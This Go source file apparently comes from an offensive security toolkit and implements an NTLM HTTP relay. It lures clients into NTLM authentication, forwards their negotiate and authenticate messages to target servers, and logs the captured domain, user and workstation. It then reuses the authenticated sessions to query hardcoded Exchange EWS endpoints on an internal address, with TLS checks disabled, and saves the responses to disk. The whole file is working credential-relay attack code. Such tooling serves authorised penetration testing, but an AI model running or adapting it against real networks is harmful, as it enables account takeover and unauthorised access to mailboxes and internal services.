package gopRelay

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/hophouse/gop/authentication/ntlm"
	gopproxy "github.com/hophouse/gop/gopProxy"
	"github.com/hophouse/gop/utils/logger"
)

func Run(serverAddr string, targets []string) {

	logger.Printf("[+] Run server on : http://%s\n", serverAddr)

	l, err := net.Listen("tcp4", serverAddr)
	if err != nil {
		logger.Fatal(err)
	}
	defer l.Close()

	connexions := []*NTLMAuthHTTPRelay{}

	logger.Print("Targets :\n")
	for i, target := range targets {
		logger.Printf("\t%d : %s\n", i, target)
	}

	for {
		conn, err := l.Accept()
		if err != nil {
			// handle error
			logger.Println(err)
			break
		}

		go func() {
			client := NTLMAuthHTTPRelay{
				ClientConnUUID: strings.Split(uuid.NewString(), "-")[0],
				clientConn:     conn,
				NTLMHandler: ntlm.NTLMAuth{
					Challenge:              "00000000",
					DomainName:             "smbdomain",
					ServerName:             "DC",
					DnsDomainName:          "smbdomain.local",
					DnsServerName:          "dc.smbdomain.local",
					PreliminaryChecksFunc:  ntlm.NTLMPreliminaryChecks,
					DispatchFunc:           ntlm.NTLMDispatch,
					ServerNegociateFunc:    ntlm.ServerNegociate,
					ServerChallengeFunc:    ntlm.ServerChallege,
					ServerAuthenticateFunc: ntlm.ServerAuthenticate,
				},
				Relays: []*Relay{},
				mu:     &sync.Mutex{},
			}

			clientInitiateRequest, err := client.initiateWWWAuthenticate()
			if err != nil {
				logger.Println(err)
				return
			}

			for _, target := range targets {
				err := client.initiateRelais(clientInitiateRequest, target)
				if err != nil {
					logger.Println(err)
					return
				}
				connexions = append(connexions, &client)

				logger.Printf("[+] Adding the connexion %s to the list\n", client.ClientConnUUID)
			}

			DisplayConnexions(connexions)

			targetURL := []string{
				"https://10.80.104.12/ews/Exchange.asmx",
				"https://10.80.104.12/ews/",
				"https://10.80.104.12/ews/Exchange.asmx",
				"https://10.80.104.12:444/ews/Exchange.asmx",
				"https://10.80.104.12:444/ews/Services.wsdl",
				"https://10.80.104.12/ews/Exchange.asmx",
			}

			for _, relay := range client.Relays {
				for _, targetU := range targetURL {
					time.Sleep(time.Second * 2)

					clientAuthRequest, _ := http.NewRequest("GET", targetU, nil)
					// gopproxy.CopyHeader(clientAuthRequest.Header, clientInitiateRequest.Header)
					_, err = relay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
					if err != nil {
						logger.Println(err)
					}
				}
			}
		}()
	}
}

type NTLMAuthHTTPRelay struct {
	ClientConnUUID string
	clientConn     net.Conn
	NTLMHandler    ntlm.NTLMAuth
	Relays         []*Relay
	mu             *sync.Mutex
	Domain         string
	Username       string
	Workstation    string
}

type Relay struct {
	parentClientConnUUID string
	target               string
	conn                 *http.Client
	mu                   *sync.Mutex
	filename             string
}

func (n *NTLMAuthHTTPRelay) initiateWWWAuthenticate() (*http.Request, error) {
	for {
		reader := bufio.NewReader(n.clientConn)

		clientInitiateRequest, err := http.ReadRequest(reader)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return nil, err
		}
		clientInitialRequestDump, err := httputil.DumpRequest(clientInitiateRequest, true)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return nil, err
		}
		io.Copy(ioutil.Discard, clientInitiateRequest.Body)
		clientInitiateRequest.Body.Close()

		for _, line := range strings.Split(string(clientInitialRequestDump), "\n") {
			logger.Fprintf(logger.Writer(), "%s | client -> gop | %s\n", n.ClientConnUUID, line)
		}
		logger.Fprint(logger.Writer(), "\n")

		// Send WWW-Authenticate: NTLM header if not present
		if clientAuthorization := clientInitiateRequest.Header.Get("Authorization"); clientAuthorization == "" {
			clientInitialResponseByte := []byte(
				"HTTP/1.1 401 Unauthorized\n" +
					"WWW-Authenticate: NTLM\n" +
					"WWW-Authenticate: Negociate\n" +
					"Connection: keep-alive\n" +
					"Content-Length: 0\n" +
					"\n\n")

			n.clientConn.Write(clientInitialResponseByte)

			for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | client <- gop | %s\n", n.ClientConnUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")

			continue
		} else {
			return clientInitiateRequest, nil
		}
	}
}

func (n *NTLMAuthHTTPRelay) initiateRelais(initialRequest *http.Request, target string) error {
	n.mu.Lock()
	defer n.mu.Unlock()

	targetURLSanitized := strings.Replace(
		strings.Replace(
			strings.Replace(
				strings.Replace(target, "?", "", -1),
				"#", "", -1),
			":", "", -1),
		"/", "", -1)

	currentRelay := Relay{
		parentClientConnUUID: n.ClientConnUUID,
		target:               target,
		mu:                   &sync.Mutex{},
		filename:             fmt.Sprintf("%s-%s.html", time.Now().Format("20060102-150405"), targetURLSanitized),
	}

	// proxyURL, _ := url.Parse("http://127.0.0.1:8888")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		// Proxy:           http.ProxyURL(proxyURL),
	}
	currentRelay.conn = &http.Client{Transport: tr}

	var clientInitiateRequest *http.Request

	for {
		if clientInitiateRequest == nil {
			clientInitiateRequest = initialRequest
		} else {
			var err error
			reader := bufio.NewReader(n.clientConn)

			clientInitiateRequest, err = http.ReadRequest(reader)
			if err != nil {
				logger.Fprintln(logger.Writer(), err)
				return err
			}
			clientInitialRequestDump, err := httputil.DumpRequest(clientInitiateRequest, true)
			if err != nil {
				logger.Fprintln(logger.Writer(), err)
				return err
			}
			io.Copy(ioutil.Discard, clientInitiateRequest.Body)
			clientInitiateRequest.Body.Close()

			for _, line := range strings.Split(string(clientInitialRequestDump), "\n") {
				logger.Fprintf(logger.Writer(), "%s | client -> gop | %s\n", n.ClientConnUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")
		}

		// Get the response header.
		clientAuthorization := clientInitiateRequest.Header.Get("Authorization")

		authorization_bytes, err := base64.StdEncoding.DecodeString(clientAuthorization[5:])
		if err != nil {
			err := fmt.Errorf("decode error authorization header : %s", clientAuthorization)
			return err
		}
		msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])

		logger.Fprintf(logger.Writer(), "%s | [+] Message type : %d\n", n.ClientConnUUID, msgType)

		// Received Negociate message. Handle it and answer with a Challenge message
		if msgType == uint32(1) {
			// Client Negotiate
			serverNegociateRequest := ntlm.NTLMSSP_NEGOTIATE{}
			serverNegociateRequest.Read(authorization_bytes)

			logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] NTLM NEGOCIATE\n", n.ClientConnUUID)
			for _, line := range strings.Split(serverNegociateRequest.ToString(), "\n") {
				logger.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
			}

			/*
			 *
			 * Client part
			 *
			 */

			clientNegotiateRequest := gopproxy.CopyRequest(clientInitiateRequest)
			clientNegotiateRequest.URL, _ = url.Parse(currentRelay.target)

			clientNegotiateResponse, err := currentRelay.SendRequestGetResponse(clientNegotiateRequest, "gop", "target")
			if err != nil {
				logger.Println(err)
				return err
			}

			authorization := clientNegotiateResponse.Header.Get("Www-Authenticate")

			if clientNegotiateResponse.StatusCode != 401 {
				err := fmt.Errorf("client respond with a %s code", clientNegotiateResponse.Status)
				logger.Fprintf(logger.Writer(), "%s |   Error       : %s\n", n.ClientConnUUID, err)
				currentRelay.conn.CloseIdleConnections()
				return err
			}

			authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
			if err != nil {
				err := fmt.Errorf("decode error authorization header : %s", authorization)
				return err
			}

			clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
			clientChallengeNTLM.Read(authorization_bytes)

			logger.Fprintf(logger.Writer(), "%s | gop :: target | [+] Client Challenge\n", n.ClientConnUUID)
			for _, line := range strings.Split(clientChallengeNTLM.ToString(), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | gop :: target | %s\n", n.ClientConnUUID, line)
			}

			/*
			 *
			 * End client part
			 *
			 */
			clientNegotiateResponseDump, err := httputil.DumpResponse(clientNegotiateResponse, true)
			if err != nil {

				return err
			}

			n.clientConn.Write(clientNegotiateResponseDump)
			for _, line := range strings.Split(string(clientNegotiateResponseDump), "\n") {
				logger.Fprintf(logger.Writer(), "%s | client <- gop | %s\n", n.ClientConnUUID, line)
			}

			logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] Sent server challenge to client\n", n.ClientConnUUID)

			continue
		}

		// Retrieve information into the Authentication message
		if msgType == uint32(3) {
			logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] Server received Authenticate\n", n.ClientConnUUID)

			serverAuthenticate := ntlm.NTLMSSP_AUTH{}
			serverAuthenticate.Read(authorization_bytes)

			n.Domain = string(serverAuthenticate.TargetName.RawData)
			n.Username = string(serverAuthenticate.Username.RawData)
			n.Workstation = string(serverAuthenticate.Workstation.RawData)

			logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] Server authenticate\n", n.ClientConnUUID)
			for _, line := range strings.Split(serverAuthenticate.ToString(), "\n") {
				logger.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
			}

			// Prepare final response to the client
			ntlmv2Response := ntlm.NTLMv2Response{}
			ntlmv2Response.Read(serverAuthenticate.NTLMv2Response.RawData)

			fmt.Fprintf(logger.Writer(), "%s | client :: gop | [+] NTLM AUTHENTICATE RESPONSE:\n", n.ClientConnUUID)
			for _, line := range strings.Split(string(ntlmv2Response.ToString()), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
			}

			/*
			 *
			 * Client part
			 *
			 */

			clientAuthRequest, _ := http.NewRequest("GET", target, nil)
			gopproxy.CopyHeader(clientAuthRequest.Header, clientInitiateRequest.Header)
			clientAuthResponse, err := currentRelay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
			if err != nil {
				logger.Println(err)
				return err
			}

			/*
			 *
			 * End client part
			 *
			 */

			// Save response

			clientInitialResponseByte := []byte(
				"HTTP/1.1 401 Unauthorized\n" +
					"WWW-Authenticate: NTLM\n" +
					"WWW-Authenticate: Negociate\n" +
					"Connection: keep-alive\n" +
					"Content-Length: 0\n" +
					"\n\n")

			n.clientConn.Write(clientInitialResponseByte)

			for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | client <- gop | %s\n", n.ClientConnUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")
			if clientAuthResponse.StatusCode == 401 {
				return fmt.Errorf("could not authenticate to the endpoint")
			}

			break
		}
	}

	n.Relays = append(n.Relays, &currentRelay)

	return nil
}

func DisplayConnexions(connexions []*NTLMAuthHTTPRelay) {
	for _, connexion := range connexions {
		logger.Printf("\t%s:\n", connexion.ClientConnUUID)

		logger.Printf("\tUser: %s\\%s\n", connexion.Domain, connexion.Username)
		logger.Printf("\tWorkstation: %s\n", connexion.Workstation)
		logger.Print("\tRelays:\n")
		for i, relay := range connexion.Relays {
			logger.Printf("\t\t%d: %s\n", i, relay.target)
		}
	}
}

func (r *Relay) SendRequestGetResponse(clientRequest *http.Request, c string, s string) (*http.Response, error) {
	r.mu.Lock()

	// clientRequest := gopproxy.CopyRequest(clientInitiateRequest)
	// clientRequest.Method = "GET"
	// targetURL, err := url.Parse(r.target)
	// if err != nil {
	// 	logger.Fprintln(logger.Writer(), err)
	// 	return nil, err
	// }
	// clientRequest.URL = targetURL
	clientRequest.Header.Set("Connection", "keep-alive")
	clientRequest.Header.Set("Accept-Encoding", "deflate")
	clientRequest.Header.Set("Content-Length", "0")

	clientRequestDump, err := httputil.DumpRequest(clientRequest, true)
	if err != nil {
		logger.Fprintln(logger.Writer(), err)
		return nil, err
	}

	for _, line := range strings.Split(string(clientRequestDump), "\n") {
		logger.Fprintf(logger.Writer(), "%s | %s -> %s : %s\n", r.parentClientConnUUID, c, s, line)
	}
	logger.Fprint(logger.Writer(), "\n")

	clientResponse, err := r.conn.Do(clientRequest)
	if err != nil {
		logger.Fprintln(logger.Writer(), err)
		return nil, err
	}
	clientResponseDump, err := httputil.DumpResponse(clientResponse, true)
	if err != nil {
		logger.Fprintln(logger.Writer(), err)
		return nil, err
	}
	io.Copy(ioutil.Discard, clientResponse.Body)
	clientResponse.Body.Close()

	for _, line := range strings.Split(string(clientResponseDump), "\n") {
		logger.Fprintf(logger.Writer(), "%s | %s <- %s : %s\n", r.parentClientConnUUID, c, s, line)
	}
	logger.Fprint(logger.Writer(), "\n")

	targetURLSanitized := strings.Replace(
		strings.Replace(
			strings.Replace(
				strings.Replace(clientRequest.URL.String(), "?", "", -1),
				"#", "", -1),
			":", "", -1),
		"/", "", -1)
	filename := fmt.Sprintf("%s-%s.html", time.Now().Format("20060102-150405"), targetURLSanitized)
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		logger.Println(err)
	}
	defer f.Close()

	_, err = f.Write(clientRequestDump)
	if err != nil {
		logger.Println(err)
	}

	_, err = f.Write(clientResponseDump)
	if err != nil {
		logger.Println(err)
	}

	r.mu.Unlock()

	return clientResponse, nil
}

func KeepAlive(w http.ResponseWriter, wg *sync.WaitGroup) {
	wg.Add(1)

	for {
		logger.Println("[+] Sending keep alive")

		hj, _ := w.(http.Hijacker)
		_, buf, _ := hj.Hijack()
		buf.WriteString("HTTP/1.1 200 OK")
		buf.WriteString("Connection: keep-alive")
		buf.WriteString("\n\n")
		buf.Flush()

		time.Sleep(20 * time.Second)
	}
}
